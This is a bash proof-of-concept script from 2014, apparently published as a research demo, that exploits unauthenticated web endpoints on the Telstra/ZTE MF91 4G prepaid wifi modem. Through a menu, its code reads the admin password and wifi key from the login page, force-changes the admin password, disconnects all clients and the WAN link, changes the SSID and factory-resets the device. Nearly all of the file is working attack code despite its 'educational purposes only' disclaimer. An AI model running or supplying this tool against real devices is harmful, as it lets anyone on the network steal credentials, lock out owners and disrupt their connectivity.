#!/bin/bash
#######################################################################
# zteeek v1.1 (released Oct 2014) 
# Copyright (C) 2014 created by sw1tch
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
# 
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>
#
########################################################################
#
# This bash script demos a few exploitable bugs in Telstra's ZTE MF91 4G prepaid wifi modem
#
# Requirements: Pretty much any shell environment should be able to run this. Uses wget and 
# some system tools like awk/sed, etc. Tested on Kali Linux x64 1.0.8. Does kinda work on
# OSX but it's not pretty. 
#
#
# You must be connected to the ZTE's wifi network to use this, but you don't need any other
# credentials or administrative rights.
#
# The script comes with no promises, warranties or guarantees. By using this script, you're
# doing so at your own risk. This is for educational purposes only.
#

function menu {

echo
echo -e "++++======= PoC for ${red}research purposes only${normal} ======++++   	"
echo
echo -e " Telstra/ZTE MF91 Pre-Paid WiFi 4G Bug Demo by sw1tch  "
echo -e "            Smashed together August, 2014		" 
echo -e "                         v1.1				" 
echo -e ${bold}
echo -e "         /\  NO AUTHENTICATION REQUIRED!  /\		"
echo -e ${norm}${red}
echo -e	"	 _.........._					"
echo -e "	| |  0  0  | | Lots of little 'puters  	     	"
echo -e "	| |   <    | | run our lives these days.	"	     
echo -e "	| |  ____  | | Let's go BUG HUNTIN' Y'ALL!     	"
echo -e "	| |________| |        				"
echo -e "	|   ______   | 	*Disclose			"
echo -e "	|  |    | |  |		bugs 			"
echo -e "	|__|____|_|__|    	   responsibly* 	" 
echo -e "				    	     		"					
echo -e "		              				"
echo -e "${normal}						"
echo -e "PLEASE NOTE: Your MF91 can get a little crunchy after  "
echo -e "playing with this script. Best to give it a hard reset "
echo -e "to get it back to a working state when you're done :)  "
echo -e
echo -e "++++=============================================++++${normal}"
echo
echo
echo -n "What IP is your Pre-Paid Telstra Wifi 4G on? (e.g. 192.168.0.1): "
read line
echo && echo -ne "${green}[*]${normal} Checking $line" to confirm valid target...""    
wget http://$line/login.asp -O "$workdir/$line" --quiet
check=`cat $workdir/$line | grep -i "Pre-Paid Telstra WIFI 4G"`
sleep 1
if [ ! -z "$check" ]; then
	echo -e "${green}confirmed!${normal}"
	cat $workdir/$line > $ZTE
	tdevice=`echo $line`
	sleep 1
else
	sleep 1
	echo -ne "${red}failed. Sorry, but I'm bailing."
	rm -rf "$workdir"
	sleep 1
	echo && echo
	exit 0
fi
#tdevice=`cat /tmp/zteeek/zteeek_valid`
echo -e
echo -e "${bold}## Menu ##${normal}"
echo -e
echo -e "${red}${bold}info${normal}${norm} - Display device information (including admin/wifi passwords)"
echo -e "${red}${bold}screen${norm}${normal} - Display the current wifi password on the Telstra/ZTE MF91 LCD screen"
echo -e "${red}${bold}clients${norm}${normal} - Display a list of connected clients"
echo -e "${red}${bold}password${norm}${normal} - Change the administrator password"
echo -e "${red}${bold}kick${norm}${normal} - Boot all clients off the wireless network"
echo -e "${red}${bold}killwan${norm}${normal} - Disconnect the Telstra/ZTE MF91's WAN connection"
echo -e "${red}${bold}isolate${norm}${normal} - Toggle AP isolation mode"
echo -e "${red}${bold}ssid${norm}${normal} - Change SSID"
echo -e "${red}${bold}nuke${norm}${normal} - Factory reset the Telstra/ZTE MF91"
echo -e "${red}${bold}quit${norm}${normal} - Return to real life"							
echo -e 

while :; do
echo -n "Choose: "
	while read choice; do
		case "$choice" in

			quit|QUIT)              echo && echo "Thanks for playing!"
						rm -rf $workdir
						sleep 1
						echo && exit 0 
						break ;;
			info|INFO)    		echo -e "${green}[*]${normal} Pulling device data..."
						wget 'http://'$tdevice'/status/basicstatus.asp' -O $workdir/devinfo --quiet
						echo
						echo -e "Device model: ${green}"`grep "var ufi_type" $workdir/devinfo | tail -1 | awk -F\' {'print $2'}`${normal}
						echo -e "IMEI: ${green}"`grep "var imei" $workdir/devinfo | tail -1 | awk -F\' {'print $2'}`${normal}
						echo -e "Hardware version: ${green}"`grep "var hardware_version" $workdir/devinfo | tail -1 | awk -F\' {'print $2'}`${normal}
						echo -e "Software version: ${green}"`grep "var software_version" $workdir/devinfo | tail -1 | awk -F\' {'print $2'}`${normal}
						echo -e "WebUI version: ${green}"`grep "var webui_version" $workdir/devinfo | tail -1 | awk -F\' {'print $2'}`${normal}
						wget 'http://'$tdevice'/login.asp' -O $ZTE --quiet
						adminpw=`grep "var old_password" $ZTE | awk -F\' {'print $2'}`
						wifipw=`grep "var Pass_Phrase" $ZTE | awk -F\' {'print $2'}`
						echo && echo -e "The admin password is: ${green}$adminpw${normal}"
						echo -e "The wireless key is: ${green}$wifipw${normal}"
						echo && break ;;
			screen|SCREEN)    	echo && echo -e -n "${green}[*]${normal} Sending command..."
                                		wget 'http://'$tdevice'/goform/get_info2?cmd=XE_DisplayPassword;' -O /dev/null --quiet
						sleep 1
						echo "done."
						echo
                                		break ;;
			clients|CLIENTS)	echo && echo -e "${green}[*]{${normal} Gathering list of clients..."
						echo
						wget 'http://'$tdevice'/goform/dhcp_list_cmd?cmd=get&rd=_=' -O $workdir/clients --quiet
						cat $workdir/clients | sed -e 's/[<!#>@]/ /g' | xargs -n 5 | awk {'print $3" "$4'}
						break ;;

			password|PASSWORD)      echo && echo -e "${green}[*]${normal} Changing admin password..."
                                                echo && echo -n "Please enter a new password (max 16 characters): "
                                                read pass
                                                echo && echo -n -e "${green}[*]${normal} Force changing password..."
                                                wget 'http://'$tdevice'/goform/upd_pwd' --post-data "password=$pass&check_password=$pass&%CF%8D=Apply" -O /dev/null --quiet
                                                sleep 2
						echo "done. Give it 30 seconds before logging in."
                                                echo
                                                break ;;

			kick|KICK)        	echo && echo -e "${green}[*]${normal} The following clients are connected:"
                                                echo && wget 'http://'$tdevice'/goform/dhcp_list_cmd?cmd=get&rd=_=' -O $workdir/clients --quiet
                                                cat $workdir/clients | sed -e 's/[<!#>@]/ /g' | xargs -n 5 | awk {'print $3" "$4'}
						echo -n "Are you sure you want to boot all clients including yourself (y/n)?: "
                                               	while read ans; do
							case "$ans" in
								Y|y)	echo && echo -e -n "${green}[*]${normal} Booting clients..."
										wget 'http://'$tdevice'/goform/dhcp_list_cmd?cmd=set&type=disconnect&mac_addr="' -O /dev/null --quiet
										sleep 1
										echo "done."
										echo
										break ;; 
									n|N)	echo && echo "Aborting..."
										echo
										break ;;
									*)	echo -n "Kick everyone or not? Enter 'y' or 'n': " ;;
											
								esac
							done
						break;;
			isolate|ISOLATE)        echo && echo -e "${green}[*]${normal} Preparing parameter to manipulate wifi isolation mode..."
                                                POSTENABLE='&ap_enable=1'
						POSTDISABLE='&ap_enable=0'
                                                echo && echo -n "Please choose 'enable' or 'disable' to change the AP isolation setting: "
                                                while read ans; do
                                                        case "$ans" in
                                                                enable|ENABLE)  	echo && echo -e -n "${green}[*]${normal} Enabling AP isolation..."
                                                                        		wget 'http://'$tdevice'/goform/wlan_set_basic_sap_profile' --post-data "$POSTENABLE" -O /dev/null --quiet
                                                                        		sleep 3
											echo "done."
                                                                        		break ;; 
                                                                disable|DISABLE)    	echo && echo -e -n "${green}[*]${normal} Disabling AP isolation..."
                                                                                        wget 'http://'$tdevice'/goform/wlan_set_basic_sap_profile' --post-data "$POSTDISABLE" -O /dev/null --quiet
                                                                        		sleep 3
											echo "done."
											break ;;
								*)			echo -n "What's the hold-up? Enter 'enable' or 'disable': ";;
                                                        esac
                                                done
                                                echo
                                                break ;;

				ssid|SSID)      echo && echo -n "Please enter a new SSID (max 24 characters): "
                                                read ssid
						echo && echo -n -e "${green}[*]${normal} Sending new SSID..."
                                                wget 'http://'$tdevice'/goform/wlan_set_basic_sap_profile' --post-data "ssid=$ssid" -O /dev/null --quiet
                                                sleep 2
						echo "done. Change your network settings to reconnect ;)"
                                                echo
                                                break ;;

			killwan|KILLWAN)	echo && echo -e -n "${green}[*]${normal} Disconnecting WAN link..."
						wget 'http://'$tdevice'/goform/ManualDisconnect?manual_mode=Disconnect&rd=' -O /dev/null --quiet
						sleep 1
						echo "done"
						echo
						break ;;
			nuke|NUKE)        	echo && echo -e "Sending this command will ${red}${bold}nuke${normal}${norm} the MF91 back to factory default settings..."
						echo && echo -e -n "${red}${bold}ARE YOU SURE${normal}${norm} (y/n)?: "
						while read ans; do
                                                        case "$ans" in
                                                                Y|y)	echo && echo -e -n "${green}[*]${normal} Sending factory reset command..."
                                                			echo -n "5.." && sleep 0.8
									echo -n "4.." && sleep 0.8
									echo -n "3.." && sleep 0.8
									echo -n "2.." && sleep 0.8
									echo -n "1.." && sleep 0.8
									wget 'http://'$tdevice'/goform/Restore' --post-data="restore=Rese" -O /dev/null --quiet
									echo "sent. Device now restarting."
                                                			echo
                                                			break ;;
							n|N)    	echo && echo "Aborting..."
                                                                        echo
                                                                        break ;;
                                                        *)      echo -en "${red}${bold}NUKE${normal}${norm} the device or not? Enter 'y' or 'n': " ;;
                                                                                        
                                                        esac
                                                done
 		                                break;;

			*)			echo
						echo -e
						echo -e "${bold}## Menu ##${normal}"
						echo -e 
						echo -e "${red}${bold}info${norm}${normal} - Display device information (including admin/wifi passwords)"
						echo -e "${red}${bold}screen${norm}${normal} - Display the current wifi password on the Telstra/ZTE MF91 LCD screen"
						echo -e "${red}${bold}clients${norm}${normal} - Display a list of connected clients"
						echo -e "${red}${bold}password${norm}${normal} - Change the administrator password"
						echo -e "${red}${bold}kick${norm}${normal} - Boot all clients off the wireless network"
						echo -e "${red}${bold}killwan${norm}${normal} - Disconnect the Telstra/ZTE MF91's WAN connection"
						echo -e "${red}${bold}isolate${norm}${normal} - Toggle AP isolation mode"
						echo -e "${red}${bold}ssid${norm}${normal} - Change SSID"
						echo -e "${red}${bold}nuke${norm}${normal} - Factory reset the Telstra/ZTE MF91"
						echo -e "${red}${bold}quit${norm}${normal} - Return to real life"                                                      
						echo && echo -n "Choose: " ;;
		esac
	done
done

}

# Setting variables

workdir=/tmp/zteeek
tmpips=$workdir/zteeek_ips
validips=$workdir/zteeek_valid
ZTE=$workdir/ztedevice

# Colours and formats for console output
green='\e[0;32m'
red='\e[0;31m'
normal='\e[0m'
bold=`tput bold`
norm=`tput sgr0`

# Cleanup and call main routine
rm -rf $workdir
clear
mkdir $workdir

menu
exit 0
